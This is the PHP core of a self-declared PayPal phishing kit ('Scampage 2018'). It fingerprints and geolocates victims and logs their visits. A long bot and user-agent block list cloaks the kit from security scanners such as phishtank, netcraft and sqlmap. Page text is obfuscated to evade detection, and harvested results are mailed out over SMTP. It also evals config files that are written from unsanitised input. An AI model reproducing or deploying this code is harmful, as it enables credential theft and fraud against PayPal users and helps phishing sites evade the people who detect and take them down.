<?php
error_reporting(1);
session_start();
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');

/**
 * KuzuluyArt - PayPal Scampage 2018.
 * Scampage Version 1.0.
 *
 * @author    Achmad Fahri (fcod3x/Kuzuluy) <achfhr33@gmail.com>
 * @link      https://www.facebook.com/fcod3x.phtml The Developer link
 * @copyright 2017 - 2018 Achmad Fahri
 * @license   http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 */

require __DIR__ . '/include/autoload.php';

class KuzuluyArt extends Kuzuluy
{
  public $smtp_config = 'smtp.conf';
  public $general_config = 'general.conf';
  public $visitor_allow = 'Allow.html';
  public $visitor_block = 'Block.html';
  public $dir_logs = __DIR__ . '/logs';
  public $dir_config = __DIR__ . '/config';
  public function redirect($url)
  {
    header("location: ".$url);
    exit;
  }
  public function ngerandom()
  {
    return md5(microtime());
  }
  public function setup()
  {
    if (!file_exists($this->dir_config . '/' . $this->general_config))
    {
      $this->redirect("admin");
    }
  }
  public function save($file, $text, $type)
  {
    $fp = fopen($file, $type);
    return fwrite($fp, $text);
    fclose($fp);
  }
  public function setGeneral($isi = array())
  {
		$text  = "\$config_email     = '".$isi[0]."';\n";
		$text .= "\$config_title     = '".$isi[1]."';\n";
    $text .= "\$config_apikey    = '".$isi[2]."';\n";
    $text .= "\$config_filter    = '".$isi[3]."';\n";
		$text .= "\$config_blocker   = '".$isi[4]."';\n";
  	$text .= "\$config_smtp      = '".$isi[5]."';\n";
    $text .= "\$config_translate = '".$isi[6]."';\n";
    return $this->save($this->dir_config . '/' . $this->general_config, $text, "w");
  }
  public function setSMTP($isi = array())
  {
    $text  = "\$config_smtphost   = '".$isi[0]."';\n";
    $text .= "\$config_smtpport   = '".$isi[1]."';\n";
    $text .= "\$config_smtpsecure = '".$isi[2]."';\n";
    $text .= "\$config_smtpuser   = '".$isi[3]."';\n";
    $text .= "\$config_smtppass   = '".$isi[4]."';\n";
    return $this->save($this->dir_config . '/' . $this->smtp_config, $text, "w");
  }
  public function getIp()
  {
    foreach (array('CLIENT_IP', 'FORWARDED', 'FORWARDED_FOR', 'FORWARDED_FOR_IP', 'VIA', 'X_FORWARDED', 'X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_VIA', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_CLUSTER_CLIENT_IP', 'REMOTE_ADDR') as $key)
    {
      if (array_key_exists($key, $_SERVER) === true)
      {
        foreach (explode(',', $_SERVER[$key]) as $ip)
        {
          $ip = trim($ip);
          if(filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
          {
            return $ip;
          }
        }
      }
    }
  }
  public function getOs()
  {
    $os = "Unknown OS";
    $os_array = array(
      '/windows nt 10/i'      =>  'Windows 10',
      '/windows nt 6.3/i'     =>  'Windows 8.1',
      '/windows nt 6.2/i'     =>  'Windows 8',
      '/windows nt 6.1/i'     =>  'Windows 7',
      '/windows nt 6.0/i'     =>  'Windows Vista',
      '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
      '/windows nt 5.1/i'     =>  'Windows XP',
      '/windows xp/i'         =>  'Windows XP',
      '/windows nt 5.0/i'     =>  'Windows 2000',
      '/windows me/i'         =>  'Windows ME',
      '/win98/i'              =>  'Windows 98',
      '/win95/i'              =>  'Windows 95',
      '/win16/i'              =>  'Windows 3.11',
      '/macintosh|mac os x/i' =>  'Mac OS X',
      '/mac_powerpc/i'        =>  'Mac OS 9',
      '/linux/i'              =>  'Linux',
      '/ubuntu/i'             =>  'Ubuntu',
      '/iphone/i'             =>  'iPhone',
      '/ipod/i'               =>  'iPod',
      '/ipad/i'               =>  'iPad',
      '/android/i'            =>  'Android',
      '/blackberry/i'         =>  'BlackBerry',
      '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value)
    {
      if (preg_match($regex, $_SERVER['HTTP_USER_AGENT']))
      {
        $os = $value;
      }
    }
    return $os;
  }
  public function getBrowser()
  {
    $browser = "Unknown Browser";
    $browser_array = array(
      '/msie/i'       =>  'Internet Explorer',
      '/firefox/i'    =>  'Firefox',
      '/safari/i'     =>  'Safari',
      '/chrome/i'     =>  'Chrome',
      '/edge/i'       =>  'Edge',
      '/opera/i'      =>  'Opera',
      '/netscape/i'   =>  'Netscape',
      '/maxthon/i'    =>  'Maxthon',
      '/konqueror/i'  =>  'Konqueror',
      '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value)
    {
      if (preg_match($regex, $_SERVER['HTTP_USER_AGENT']))
      {
        $browser = $value;
      }
    }
    return $browser;
  }
  public function getAgent()
  {
    return $_SERVER['HTTP_USER_AGENT'];
  }
  public function getLang()
  {
    return substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
  }
  public function getRef()
  {
    if (isset($_SERVER['HTTP_REFERER']))
    {
      $ref = $_SERVER['HTTP_REFERER'];
  	}
    else
    {
  	  $ref = "No Referer";
  	}
    return $ref;
  }
  public function ngecurl($url, $str)
  {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url.$str);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
  }
  public function dataIP($ip, $data)
  {
    $json = $this->ngecurl("http://extreme-ip-lookup.com/json/", $ip);
    if ($json == '' or false)
    {
      return "127.0.0.1";
    }
    $code = json_decode($json);
    $str = "";
    switch ($data)
    {
      case "code":
      $str = $code->countryCode;
      if ($str == "GB")
      {
        $str =  "UK";
      }
      else if ($str == "C2" || $str == "A1")
      {
        $str = "US";
      }
      break;
    case "country":
      $str = $code->country;
      break;
    case "city":
      $str = $code->city;
      break;
    case "state":
      $str = $code->region;
      break;
    case "isp":
      $str = $code->isp;
      break;
    case "ip":
      $str = $code->query;
      break;
    default:
      $str = $code->status;
    }
    return $str;
  }
  public function getHost($ip)
  {
    return gethostbyaddr($ip);
  }
  public function blocked($reason)
  {
  	$text = "<b>[".$_SESSION['code']." | ".date('d/m/y H:i:s')." | <font color=red>$reason</font>] (".$_SESSION['ip']." - ".$_SESSION['isp']." - ".$_SESSION['host'].") [".$_SESSION['ref']." | ".$_SESSION['agent']."]</b><br>";
    return $this->save($this->dir_logs . '/' . $this->visitor_block, $text, "a");
  }
  public function visitor($page)
  {
  	$text = "<b>[".$_SESSION['code']." | ".date('d/m/y H:i:s')." | <font color=green>$page</font>] (".$_SESSION['ip']." - ".$_SESSION['isp']." - ".$_SESSION['host'].") [".$_SESSION['ref']." | ".$_SESSION['agent']."]</b><br>";
    return $this->save($this->dir_logs . '/' . $this->visitor_allow, $text, "a");
  }
  public function blocker()
  {
    require_once __DIR__ . '/filter.php';

    if ($_SESSION['agent'] == "")
    {
    	$this->blocked("Unknown Agent");
    	$this->redirect("success");
    }
    if (preg_match('/choppy|help|ahrefs|majestic12|redlug|scan|total|bot|shrinktheweb|zyborg|nuhk|ask|wget|80legs|winhttp|youda|zune|crawl|curl|dataprovider|comodo|casper|zmeu|skygrid|sucker|flicky|turnit|diavol|cmsworld|virus|Ruby|InfoPath|UNTRUSTED|binlar|kmccrew|nutch|planetwork|search|get|GetURLInfo|spider|find|java|Phantom|majesticsEO|google|yahoo|teoma|contaxe|yandex|facebook|CFNetwork|aolbuild|sogou|bing|duckduckgo|phishtank|checkpriv|clshttp|email|extract|grab|harvest|python|baidu|Slurp|archiver|Rambler|Media Center|PagesInventory|phishtank|Win98|Konqueror|libwww|webcapture|netcraft|loader|miner|nikto|\.NET CLR|NET4\.0C|NET4\.0E|MDDC|SLCC2|php|Scrapy|lynx|httrack|feedfinder|g00g1e|heritrix|postrank|siclab|sqlmap|xxxyy/i', $_SESSION['agent']))
    {
        $this->blocked("Block Agent");
      	$this->redirect("success");
    }
    if (in_array($_SESSION['ip'], $bannedIP))
    {
      $this->blocked("Block IP v1");
      $this->redirect("success");
    }
    else
    {
    	foreach ($bannedIP as $ip)
      {
    		if (preg_match("/$ip/", $_SESSION['ip']))
        {
          $this->blocked("Block IP v2");
        	$this->redirect("success");
    		}
    	}
    }
    foreach ($bannedHOST as $host)
    {
    	if (substr_count($_SESSION['host'], $host) > 0)
      {
        $this->blocked("Block Hostname");
      	$this->redirect("success");
    	}
    }
    foreach ($bannedProxy as $proxy)
    {
      if (isset($_SERVER[$proxy]))
      {
        $this->blocked("Block Proxy");
      	$this->redirect("success");
      }
    }
    foreach ($bannedPort as $port)
    {
      if (@fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 1))
      {
        $this->blocked("Block Port");
      	$this->redirect("success");
      }
    }
    $_SESSION['visitor'] = true;
  }
  public function session()
  {
    if (!isset($_SESSION['visitor']))
    {
    	$this->blocked("Block Session");
    	$this->redirect("success");
    }
  }
  public function getStr($string, $start, $end)
  {
    $str = explode($start, $string);
  	$str = explode($end, $str[1]);
  	return $str[0];
  }
  public function encode($str)
  {
    $crypt = array(
      "A" => "065",
      "a" => "097",
      "B" => "066",
      "b" => "098",
      "C" => "067",
      "c" => "099",
      "D" => "068",
      "d" => "100",
      "E" => "069",
      "e" => "101",
      "F" => "070",
      "f" => "102",
      "G" => "071",
      "g" => "103",
      "H" => "072",
      "h" => "104",
      "I" => "073",
      "i" => "105",
      "J" => "074",
      "j" => "106",
      "K" => "075",
      "k" => "107",
      "L" => "076",
      "l" => "108",
      "M" => "077",
      "m" => "109",
      "N" => "078",
      "n" => "110",
      "O" => "079",
      "o" => "111",
      "P" => "080",
      "p" => "112",
      "Q" => "081",
      "q" => "113",
      "R" => "082",
      "r" => "114",
      "S" => "083",
      "s" => "115",
      "T" => "084",
      "t" => "116",
      "U" => "085",
      "u" => "117",
      "V" => "086",
      "v" => "118",
      "W" => "087",
      "w" => "119",
      "X" => "088",
      "x" => "120",
      "Y" => "089",
      "y" => "121",
      "Z" => "090",
      "z" => "122",
      "0" => "048",
      "1" => "049",
      "2" => "050",
      "3" => "051",
      "4" => "052",
      "5" => "053",
      "6" => "054",
      "7" => "055",
      "8" => "056",
      "9" => "057",
      "&" => "038",
      " " => "032",
      "_" => "095",
      "-" => "045",
      "@" => "064",
      "." => "046"
    );
  $encode = "";
  for ($i=0; $i < strlen($str); $i++)
  {
    $key = substr($str, $i, 1);
    if (array_key_exists($key, $crypt))
    {
      $random = rand(1, 3);
      if ($random == '2')
      {
        $encode = $encode.$key;
      }
      else
      {
        $encode = $encode."&#".$crypt[$key].";";
      }
    }
    else
    {
      $encode = $encode.$key;
    }
  }
  return $encode;
  }
  public function content($url)
  {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
  }
  public function transcode($text)
  {
    if (file_exists($api->dir_config . '/' . $api->general_config))
    {
      @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
    }
    if ($config_translate == 1)
    {
      return $this->encode($this->setSource('en')->setTarget($_SESSION['lang'])->translate($text));
    }
    else
    {
      return $this->encode($text);
    }
  }
  public function waiting()
  {
    return sleep(rand(1,3));
  }
  public function ngesend($to, $subject, $body)
  {
    if (file_exists($this->dir_config . '/' . $this->smtp_config))
    {
      @eval(file_get_contents($this->dir_config . '/' . $this->smtp_config));
    }
    if ($config_smtpsecure == 1){
      $secure = "tls";
    }
    else
    {
      $secure = "none";
    }
    if ($this->checkSmtp() == true)
    {
      try
      {
        $this->SMTPDebug = 2;
        $this->isSMTP();
        $this->Host = $config_smtphost;
        $this->SMTPAuth = true;
        $this->Username = $config_smtpuser;
        $this->Password = $config_smtppass;
        $this->SMTPSecure = $secure;
        $this->Port = $config_smtpport;

        $this->setFrom('result@kuzuluy.art', 'KuzuluyArt');
        $this->addAddress($to);
        $this->isHTML(true);
        $this->Subject = $subject;
        $this->Body    = $body;
        $this->send();
      }
      catch (Exception $e)
      {
        die($this->ErrorInfo);
      }
    }
  }
  public function checkSmtp()
  {
    if (file_exists($this->dir_config . '/' . $this->smtp_config))
    {
      @eval(file_get_contents($this->dir_config . '/' . $this->smtp_config));
    }
    if ($config_smtpsecure == 1){
      $secure = "tls";
    }
    else
    {
      $secure = "none";
    }
    $this->isSMTP();
    $this->Host = $config_smtphost;
    $this->Port = $config_smtpport;
    $this->SMTPAuth = true;
    $this->SMTPSecure = $secure;
    $this->Username = $config_smtpuser;
    $this->Password = $config_smtppass;
    $this->Timeout = 10;
    $this->From = $config_smtpuser;
    $this->FromName = "KuzuluyArt";

    if ($this->smtpConnect())
    {
      $this->smtpClose();
      return true;
    }
    else
    {
      return false;
    }
  }
}

$api =  new KuzuluyArt();
?>
